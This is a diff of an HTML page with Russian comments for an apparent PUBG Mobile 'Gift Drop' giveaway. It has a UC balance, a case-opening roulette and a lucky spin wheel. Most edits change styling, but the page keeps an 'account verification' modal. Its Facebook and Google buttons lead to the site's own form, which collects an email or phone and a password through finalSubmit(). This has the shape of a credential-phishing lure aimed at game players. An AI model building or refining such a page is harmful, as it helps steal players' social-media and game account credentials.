@@ -15,46 +15,35 @@
             --pubg-gold-dark: #cc9600;
             --pubg-dark: #0b0c0d;
             --pubg-blue: #0084ff;
-            --pubg-dark-blue: #001529;
         }
 
+        /* ДОБАВЛЕНО: Фоновое изображение для всего сайта */
         body {
+            background-image: url('IMG_1807.jpeg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
             background-color: var(--pubg-dark);
             color: white;
             font-family: 'Inter', sans-serif;
-            margin: 0; padding: 0;
+            margin: 0; 
+            padding: 0;
             overflow-x: hidden;
             user-select: none;
             -webkit-tap-highlight-color: transparent;
             position: relative;
-            min-height: 100vh;
         }
 
-        /* Фоновое изображение с минимальным размытием */
+        /* ДОБАВЛЕНО: Затемнение фона для лучшей читаемости контента */
         body::before {
             content: '';
             position: fixed;
             top: 0;
             left: 0;
-            right: 0;
-            bottom: 0;
-            background-image: url('IMG_1730.png');
-            background-size: cover;
-            background-position: center;
-            background-repeat: no-repeat;
-            filter: blur(3px) brightness(0.7);
-            z-index: -1;
-        }
-
-        /* Градиентное наложение для глубины */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(135deg, rgba(0, 21, 41, 0.85) 0%, rgba(11, 12, 13, 0.9) 100%);
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
             z-index: -1;
         }
 
@@ -64,70 +53,59 @@
             display: inline-flex;
             align-items: center;
             justify-content: center;
-            background: linear-gradient(180deg, #2a2b30 0%, #1a1b1f 100%);
-            border: 1px solid rgba(196, 161, 98, 0.4);
-            border-radius: 6px;
-            padding: 2px 6px;
-            font-size: 11px;
+            background: #1a1a1a;
+            border: 1px solid #c4a162;
+            border-radius: 4px;
+            padding: 1px 4px;
+            font-size: 10px;
             font-weight: 900;
-            color: #ffd166;
+            color: #fff;
             margin-right: 4px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
         }
 
         header {
-            background: rgba(0, 8, 20, 0.9);
+            background: rgba(0, 0, 0, 0.95);
             padding: 12px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid rgba(255, 188, 0, 0.1);
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             position: sticky; top: 0; z-index: 100;
-            backdrop-filter: blur(8px);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
         }
 
         .balance-display {
-            background: linear-gradient(180deg, rgba(0, 132, 255, 0.15) 0%, rgba(0, 84, 168, 0.1) 100%);
+            background: rgba(255, 255, 255, 0.05);
             border-radius: 20px;
-            padding: 5px 12px;
+            padding: 4px 10px;
             display: flex;
             align-items: center;
-            gap: 5px;
-            border: 1px solid rgba(0, 132, 255, 0.3);
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+            gap: 4px;
+            border: 1px solid rgba(255,255,255,0.1);
         }
 
         .btn-plus {
-            background: linear-gradient(180deg, #4caf50 0%, #388e3c 100%);
-            width: 18px; height: 18px;
+            background: #4caf50;
+            width: 16px; height: 16px;
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 11px; font-weight: bold;
-            color: white;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+            font-size: 10px; font-weight: bold;
         }
 
         /* КЕЙС */
         .case-container {
             position: relative;
-            width: 100%;
-            height: 180px;
+            width: 100%;            height: 180px;
             overflow: hidden;
             margin: 20px 0;
-            border-radius: 12px;
-            background: rgba(0, 8, 20, 0.5);
-            border: 1px solid rgba(255, 188, 0, 0.1);
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.4);
         }
 
         .case-line {
             position: absolute;
             top: 0; left: 50%;
-            width: 3px; height: 100%;
-            background: linear-gradient(to bottom, transparent, var(--pubg-gold), transparent);
+            width: 2px; height: 100%;
+            background: var(--pubg-gold);
             z-index: 20;
-            box-shadow: 0 0 20px var(--pubg-gold);
+            box-shadow: 0 0 15px var(--pubg-gold);
             transform: translateX(-50%);
         }
 
@@ -145,18 +123,12 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            opacity: 0.6;
-            transition: opacity 0.3s;
+            opacity: 0.5;
         }
-        .case-item img { 
-            width: 100px; 
-            height: 100px; 
-            object-fit: contain;
-            filter: drop-shadow(0 4px 8px rgba(0, 0, 0, 0.5));
-        }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; }
 
         .btn-blue {
-            background: linear-gradient(180deg, #0084ff 0%, #0066cc 100%);
+            background: var(--pubg-blue);
             color: white;
             width: calc(100% - 32px);
             margin: 0 16px;
@@ -167,78 +139,35 @@
             text-align: center;
             display: block;
             cursor: pointer;
-            border: none;
-            transition: all 0.2s;
-            box-shadow: 0 6px 16px rgba(0, 132, 255, 0.3);
-            position: relative;
-            overflow: hidden;
-        }
-
-        .btn-blue::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
-            transition: left 0.5s;
-        }
-
-        .btn-blue:hover::after {
-            left: 100%;
-        }
-
-        .btn-blue:active { 
-            transform: scale(0.96); 
-            box-shadow: 0 3px 8px rgba(0, 132, 255, 0.3);
         }
 
         /* ОКНО ВЫИГРЫША */
         .win-modal {
             position: fixed; inset: 0;
-            background: rgba(0, 8, 20, 0.95);
-            backdrop-filter: blur(15px);
+            background: rgba(0,0,0,0.94);
+            backdrop-filter: blur(10px);
             z-index: 2000; display: none;
             flex-direction: column; justify-content: center; align-items: center; padding: 20px;
         }
 
         .win-card {
-            background: linear-gradient(180deg, rgba(28, 29, 34, 0.95) 0%, rgba(10, 11, 13, 0.98) 100%);
-            border: 2px solid rgba(255, 188, 0, 0.4);
-            border-radius: 20px; 
+            background: linear-gradient(180deg, #1c1d22 0%, #0a0b0d 100%);
+            border: 1px solid rgba(255, 188, 0, 0.3);
+            border-radius: 16px; 
             padding: 50px 24px 30px 24px; 
             width: 90%; max-width: 340px; 
             text-align: center;
             position: relative;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.7);
-            overflow: hidden;
-        }
-
-        .win-card::before {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            height: 4px;
-            background: linear-gradient(90deg, #0084ff, #ffbc00, #0084ff);
-            z-index: 1;
+            box-shadow: 0 0 40px rgba(0,0,0,0.8);
         }
 
         .item-glow {
             position: absolute;
             top: 40%; left: 50%;
             transform: translate(-50%, -50%);
-            width: 240px; height: 240px;
-            background: radial-gradient(circle, rgba(255, 188, 0, 0.25) 0%, transparent 70%);
+            width: 220px; height: 220px;
+            background: radial-gradient(circle, rgba(255, 188, 0, 0.2) 0%, transparent 70%);
             z-index: 0;
-            animation: pulse 2s infinite alternate;
-        }
-
-        @keyframes pulse {
-            from { opacity: 0.7; transform: translate(-50%, -50%) scale(0.95); }
-            to { opacity: 1; transform: translate(-50%, -50%) scale(1.05); }
         }
 
         #winPrizeImage {
@@ -246,178 +175,49 @@
             z-index: 1;
             width: 160px; height: 160px;
             margin: 0 auto 40px auto;
-            filter: drop-shadow(0 15px 30px rgba(0,0,0,0.7));
-            animation: float 3s ease-in-out infinite;
-        }
-
-        @keyframes float {
-            0%, 100% { transform: translateY(0px); }
-            50% { transform: translateY(-10px); }
+            filter: drop-shadow(0 10px 25px rgba(0,0,0,0.6));
         }
 
         .btn-collect {
             background: linear-gradient(180deg, #ffbc00 0%, #cc9600 100%);
             color: #000;
             width: 100%;
-            padding: 16px;
-            border-radius: 8px;
+            padding: 14px;
+            border-radius: 4px;
             font-family: 'Teko', sans-serif;
             font-size: 24px;
             font-weight: 700;
             text-transform: uppercase;
-            letter-spacing: 1.5px;
-            box-shadow: 0 6px 25px rgba(255, 188, 0, 0.5);
+            letter-spacing: 1px;
+            box-shadow: 0 4px 20px rgba(255, 188, 0, 0.4);
             border: none;
             cursor: pointer;
             position: relative;
             z-index: 2;
-            transition: all 0.2s;
-            overflow: hidden;
         }
 
-        .btn-collect::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: -100%;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
-            transition: left 0.5s;
-        }
-
-        .btn-collect:hover::after {
-            left: 100%;
-        }
-
-        .btn-collect:active { 
-            transform: scale(0.96); 
-            box-shadow: 0 3px 15px rgba(255, 188, 0, 0.5);
-        }
+        .btn-collect:active { transform: scale(0.96); }
 
         /* НАВИГАЦИЯ */
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
-            background: rgba(0, 8, 20, 0.95);
-            height: 70px;
+            background: rgba(0, 0, 0, 0.9); 
+            height: 65px;
             display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 188, 0, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             z-index: 50;
             backdrop-filter: blur(10px);
-            box-shadow: 0 -4px 20px rgba(0, 0, 0, 0.4);
         }
-        
-        .nav-item { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            color: #8899aa; 
-            font-size: 11px; 
-            cursor: pointer; 
-            transition: all 0.3s;
-            padding: 8px 12px;
-            border-radius: 10px;
-        }
-        
-        .nav-item i { 
-            font-size: 22px; 
-            margin-bottom: 4px; 
-            transition: all 0.3s;
-        }
-        
-        .nav-item.active { 
-            color: var(--pubg-gold); 
-            background: rgba(255, 188, 0, 0.1);
-            transform: translateY(-5px);
-        }
-        
-        .nav-item.active i {
-            color: var(--pubg-gold);
-            text-shadow: 0 0 10px rgba(255, 188, 0, 0.5);
-        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #aaa; font-size: 10px; cursor: pointer;}
+        .nav-item.active { color: var(--pubg-gold); }
 
         .modal {
-            position: fixed; inset: 0; background: rgba(0, 8, 20, 0.97);
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 1000; display: none; flex-direction: column; padding: 20px;
             justify-content: center;
-            backdrop-filter: blur(15px);
         }
-        
-        .login-card { 
-            background: linear-gradient(180deg, rgba(30, 35, 45, 0.95) 0%, rgba(15, 20, 30, 0.98) 100%);
-            color: white; 
-            border-radius: 20px; 
-            padding: 28px; 
-            border: 1px solid rgba(255, 188, 0, 0.2);
-            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.6);
-        }
-        
-        input { 
-            width: 100%; 
-            padding: 16px; 
-            margin: 10px 0; 
-            border: 1px solid rgba(255, 255, 255, 0.1); 
-            border-radius: 10px; 
-            color: white;
-            background: rgba(255, 255, 255, 0.05);
-            font-size: 16px;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: var(--pubg-blue);
-            box-shadow: 0 0 10px rgba(0, 132, 255, 0.3);
-        }
-
-        /* Контентные блоки */
-        main, section {
-            position: relative;
-            z-index: 1;
-        }
-
-        /* Стили для карточек в главном меню */
-        .bg-\[\\#151618\] {
-            background: linear-gradient(180deg, rgba(25, 30, 40, 0.9) 0%, rgba(15, 20, 30, 0.95) 100%) !important;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255, 188, 0, 0.15) !important;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
-            transition: all 0.3s;
-        }
-
-        .bg-\[\\#151618\]:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
-            border-color: rgba(255, 188, 0, 0.3) !important;
-        }
-
-        .bg-\[\\#25262b\] {
-            background: linear-gradient(180deg, rgba(40, 45, 55, 0.9) 0%, rgba(25, 30, 40, 0.95) 100%) !important;
-            border: 1px solid rgba(255, 255, 255, 0.05) !important;
-        }
-
-        /* Текст в карточках */
-        .pubg-font.text-blue-400 {
-            color: #60a5fa !important;
-            text-shadow: 0 2px 8px rgba(96, 165, 250, 0.3);
-        }
-
-        .pubg-font.text-yellow-500 {
-            color: #fbbf24 !important;
-            text-shadow: 0 2px 8px rgba(251, 191, 36, 0.3);
-        }
-
-        /* Заголовки */
-        h1, h2, h3 {
-            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.5);
-        }
-
-        /* Стиль для выбранного элемента в рулетке */
-        .border-\[\#ffbc00\] {
-            border-color: #ffbc00 !important;
-            box-shadow: 0 0 20px rgba(255, 188, 0, 0.7) !important;
-            transform: scale(1.05);
-            transition: all 0.3s;
-        }
+        .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
     </style>
 </head>
 <body>
@@ -428,33 +228,25 @@
             <span class="text-sm font-bold">Назад</span>
         </div>
         <div class="text-center" style="flex: 1;">
-            <h1 class="pubg-font text-lg leading-none text-white">Gift Drop</h1>
-            <div class="text-xs text-gray-400 mt-1">PUBG Mobile Giveaway</div>
+            <h1 class="pubg-font text-lg leading-none">Gift Drop</h1>
         </div>
         <div class="balance-display">
             <span class="uc-icon">UC</span>
-            <span id="headerBalance" class="text-sm font-bold text-white">60</span>
+            <span id="headerBalance" class="text-sm font-bold">60</span>
             <div class="btn-plus">+</div>
         </div>
     </header>
 
     <!-- ГЛАВНОЕ МЕНЮ (HUB) -->
     <main id="section-hub" class="p-4">
-        <div class="text-center mb-6">
-            <div class="inline-block bg-gradient-to-r from-blue-500/20 to-yellow-500/20 rounded-full px-4 py-2 mb-2">
-                <span class="text-sm text-gray-300">мини-приложение</span>
-            </div>
-        </div>
         <div class="grid grid-cols-2 gap-4 mt-4">
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
                 <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
-                <div class="pubg-font text-blue-400 text-lg mb-1">GIFT DROP</div>
-                <div class="text-xs text-gray-300">UC 60 +</div>
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
             <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
                 <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
-                <div class="pubg-font text-yellow-500 text-lg mb-1">LUCKY SPIN</div>
-                <div class="text-xs text-gray-300">Daily rewards</div>
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
             </div>
         </div>
     </main>
@@ -463,7 +255,6 @@
     <section id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
-            <p class="text-gray-400 mt-2">Open to get rare PUBG items</p>
         </div>
         <div class="case-container">
             <div class="case-line"></div>
@@ -477,7 +268,6 @@
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
-            <p class="text-gray-400 mt-2">Spin the wheel for amazing prizes</p>
         </div>
         <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
             <div class="grid grid-cols-3 gap-3">
@@ -508,19 +298,19 @@
     <!-- АВТОРИЗАЦИЯ -->
     <div id="modalAuth" class="modal">
         <div class="login-card">
-            <h2 class="font-black text-xl mb-4 text-center text-white">Верификация аккаунта</h2>
-            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3 hover:bg-[#166fe5] transition-colors"><i class="fab fa-facebook-f"></i> Facebook</button>
-            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3 hover:bg-gray-100 transition-colors"><i class="fab fa-google"></i> Google</button>
-            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center hover:text-white transition-colors">Закрыть</button>
+            <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
+            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
+            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
+            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center">Отмена</button>
         </div>
     </div>
 
     <div id="modalForm" class="modal">
         <div class="login-card">
-            <h2 id="methodName" class="font-black text-xl mb-4 text-white">Login</h2>
+            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
             <input type="text" id="inpUser" placeholder="Email или телефон">
             <input type="password" id="inpPass" placeholder="Пароль">
-            <button onclick="finalSubmit()" class="w-full bg-gradient-to-r from-blue-600 to-blue-700 text-white p-4 rounded-xl mt-4 font-bold hover:from-blue-700 hover:to-blue-800 transition-all">Войти</button>
+            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
         </div>
     </div>
 
@@ -623,14 +413,12 @@
                 cells.forEach(id => {
                     document.getElementById(id).style.borderColor = 'transparent';
                     document.getElementById(id).style.boxShadow = 'none';
-                    document.getElementById(id).style.transform = 'scale(1)';
                 });
 
                 const currentId = cells[step % cells.length];
                 const currentEl = document.getElementById(currentId);
                 currentEl.style.borderColor = '#ffbc00';
-                currentEl.style.boxShadow = '0 0 20px rgba(255, 188, 0, 0.7)';
-                currentEl.style.transform = 'scale(1.05)';
+                currentEl.style.boxShadow = '0 0 15px rgba(255, 188, 0, 0.5)';
 
                 step++;
                 if (step >= totalSteps) {
